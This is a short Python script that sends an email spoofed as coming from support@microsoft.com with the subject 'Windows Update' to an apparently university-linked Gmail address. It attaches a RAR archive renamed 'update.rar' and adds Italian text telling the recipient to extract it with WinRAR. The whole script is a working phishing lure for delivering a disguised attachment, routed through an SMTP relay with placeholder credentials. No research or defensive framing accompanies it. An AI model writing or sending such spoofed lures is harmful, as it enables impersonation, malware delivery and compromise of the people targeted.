import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

msg = MIMEMultipart()
msg['From'] = 'support@microsoft.com'
msg['To'] = 'secretary.uni.local@gmail.com'
msg['Subject'] = 'Windows Update'

msg.attach(MIMEText('Estrai RAR con WinRAR.'))

with open('/Downloads/test1.rar', 'rb') as f:
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(f.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="update.rar"')
    msg.attach(part)

server = smtplib.SMTP('mail.smtp2go.com', 587)  # O tuo relay
server.starttls()
server.login('user', 'pass')
server.send_message(msg)
server.quit()
